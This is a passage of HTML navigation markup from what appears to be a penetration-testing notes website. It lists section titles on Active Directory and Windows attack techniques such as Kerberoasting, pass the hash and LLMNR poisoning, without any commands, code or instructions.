        
  
  <span class="md-ellipsis">
    SHELL
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4" id="__nav_2_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    4 PostExploitation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4">
            <span class="md-nav__icon md-icon"></span>
            4 PostExploitation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_1" id="__nav_2_2_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CommonServices
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_1">
            <span class="md-nav__icon md-icon"></span>
            CommonServices
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CommonServices/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Server Message Block (SMB)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_2" id="__nav_2_2_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CredentialHarvesting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_2">
            <span class="md-nav__icon md-icon"></span>
            CredentialHarvesting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_2_1" id="__nav_2_2_4_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    WindowsLateralMovement
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_4_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_2_1">
            <span class="md-nav__icon md-icon"></span>
            WindowsLateralMovement
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheHash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Hash (PtH)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromLinux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Ticket (PtT) from Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLateralMovement/PassTheTicketFromWindows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Ticket (PtT) from Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_2_2" id="__nav_2_2_4_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    WindowsLocalPassword
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="5" aria-labelledby="__nav_2_2_4_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_2_2">
            <span class="md-nav__icon md-icon"></span>
            WindowsLocalPassword
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Active Directory &amp; NTDS.dit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking LSASS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking SAM
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_3" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_3" id="__nav_2_2_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PrivilegeEscalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_3">
            <span class="md-nav__icon md-icon"></span>
            PrivilegeEscalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PRIVILEGE ESCALATION
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/PrivilegeEscalation/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credential Hunting in Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_4_4" >
        
          
          <label class="md-nav__link" for="__nav_2_2_4_4" id="__nav_2_2_4_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TransferFiles
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2_4_4">
            <span class="md-nav__icon md-icon"></span>
            TransferFiles
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/TransferFiles/Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OPEN SERVER:
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Phases/4-PostExploitation/TransferFiles/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attack to Target
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Utils
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Utils
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/Utils/Databases/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DATABASES
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    old ActiveDirectory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            old ActiveDirectory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_1" >
        
          
          <label class="md-nav__link" for="__nav_2_4_1" id="__nav_2_4_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    ACL
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_1">
            <span class="md-nav__icon md-icon"></span>
            ACL
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/ACL/AbsuingACL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ACL Abuse Tactics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/ACL/DCSync/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DCSync
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/ACL/EnumerationACL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ACL Enumeration
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_2" >
        
          
          <label class="md-nav__link" for="__nav_2_4_2" id="__nav_2_4_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    DomainTrusts
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_2">
            <span class="md-nav__icon md-icon"></span>
            DomainTrusts
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/DomainTrusts/AttackingDomainTrustsChildTrusts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trusts - Child -&gt; Parent Trusts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/DomainTrusts/CrossForestTrustAbuse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trusts - Cross-Forest Trust Abuse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/DomainTrusts/DomainTrusts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain Trusts
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_3" >
        
          
          <label class="md-nav__link" for="__nav_2_4_3" id="__nav_2_4_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Enumeration
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_3">
            <span class="md-nav__icon md-icon"></span>
            Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Enumeration/CredentialedEnumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credentialed Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Enumeration/InitialEnumerationoftheDomain/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    InitialEnumerationoftheDomain
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4_4" id="__nav_2_4_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Kerberoasting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_4">
            <span class="md-nav__icon md-icon"></span>
            Kerberoasting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Kerberoasting/Kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_5" >
        
          
          <label class="md-nav__link" for="__nav_2_4_5" id="__nav_2_4_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    LLMNR&NBT NS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_5">
            <span class="md-nav__icon md-icon"></span>
            LLMNR&NBT NS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/LLMNR%26NBT-NS/LLMNR_NBT-NS%20Poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LLMNR/NBT-NS Poisoning
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_6" >
        
          
          <label class="md-nav__link" for="__nav_2_4_6" id="__nav_2_4_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PasswordSpraying
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_6">
            <span class="md-nav__icon md-icon"></span>
            PasswordSpraying
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/PasswordSpraying/PasswordSpraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Password Spraying
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4_7" >
        
          
          <label class="md-nav__link" for="__nav_2_4_7" id="__nav_2_4_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Stacking
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_4_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4_7">
            <span class="md-nav__icon md-icon"></span>
            Stacking
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bleeding Edge Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Stacking/DoubleHop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberos "Double Hop" Problem
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous Misconfigurations
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../old/old_ActiveDirectory/Stacking/PrivilegedAccess/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Privileged Access
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    zNew
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            zNew
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    ActiveDirectory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            ActiveDirectory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    ActiveDirectory
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    ActiveDirectory
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#domain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Domain Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Domain Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#identifying-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Identifying Hosts
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#scan-alive-hosts" class="md-nav__link">
    <span class="md-ellipsis">
      Scan Alive hosts
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#making-a-target-user-list" class="md-nav__link">
    <span class="md-ellipsis">
      Making a Target User List
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Making a Target User List">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#smb-null-session-to-pull-user-list" class="md-nav__link">
    <span class="md-ellipsis">
      SMB NULL Session to Pull User List
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#gathering-users-with-ldap-anonymous" class="md-nav__link">
    <span class="md-ellipsis">
      Gathering Users with LDAP Anonymous
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-users-with-kerbrute" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Users with Kerbrute
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#llmnrnbt-ns-poisoning" class="md-nav__link">
    <span class="md-ellipsis">
      LLMNR/NBT-NS Poisoning
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LLMNR/NBT-NS Poisoning">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#responder-httpsgithubcomlgandxresponder" class="md-nav__link">
    <span class="md-ellipsis">
      [Responder] (https://github.com/lgandx/Responder)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inveigh" class="md-nav__link">
    <span class="md-ellipsis">
      Inveigh
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#c-inveigh-inveighzero" class="md-nav__link">
    <span class="md-ellipsis">
      C# Inveigh (InveighZero)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-an-ntlmv2-hash-with-hashcat" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking an NTLMv2 Hash With Hashcat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#relay" class="md-nav__link">
    <span class="md-ellipsis">
      Relay
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#low-hanging-fruits" class="md-nav__link">
    <span class="md-ellipsis">
      Low Hanging Fruits
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Low Hanging Fruits">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#zerologon" class="md-nav__link">
    <span class="md-ellipsis">
      ZeroLogon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#credentials-in-smb-shares-and-sysvol-scripts" class="md-nav__link">
    <span class="md-ellipsis">
      Credentials in SMB Shares and SYSVOL Scripts
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Credentials in SMB Shares and SYSVOL Scripts">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovering" class="md-nav__link">
    <span class="md-ellipsis">
      Discovering
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#group-policy-preferences-gpp-passwords" class="md-nav__link">
    <span class="md-ellipsis">
      Group Policy Preferences (GPP) Passwords
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Group Policy Preferences (GPP) Passwords">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#locating-retrieving-gpp-passwords-with-crackmapexec" class="md-nav__link">
    <span class="md-ellipsis">
      Locating &amp; Retrieving GPP Passwords with CrackMapExec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#decrypting-the-password-with-gpp-decrypt" class="md-nav__link">
    <span class="md-ellipsis">
      Decrypting the Password with gpp-decrypt
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
        
          
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    01 NoCredentials
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            01 NoCredentials
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01-NoCredentials/DomainEnumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01-NoCredentials/FindUsernameList/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Making a Target User List
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01-NoCredentials/LowHanging/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LowHanging
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../01-NoCredentials/Poisoning/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LLMNR/NBT-NS Poisoning
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_3" >
        
          
          <label class="md-nav__link" for="__nav_3_1_3" id="__nav_3_1_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    02 ClearTextPasswordOrValidUsernames
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_3">
            <span class="md-nav__icon md-icon"></span>
            02 ClearTextPasswordOrValidUsernames
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../02-ClearTextPasswordOrValidUsernames/ASREPRoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ASREPRoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../02-ClearTextPasswordOrValidUsernames/PasswordSpraying/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Enumerating the Password Policy
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_4" >
        
          
          <label class="md-nav__link" for="__nav_3_1_4" id="__nav_3_1_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    03 AuthenticatedWithValidCredentials
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_4">
            <span class="md-nav__icon md-icon"></span>
            03 AuthenticatedWithValidCredentials
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03-AuthenticatedWithValidCredentials/CredentialedEnumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credentialed Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03-AuthenticatedWithValidCredentials/Kerberoasting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kerberoasting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../03-AuthenticatedWithValidCredentials/Vulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
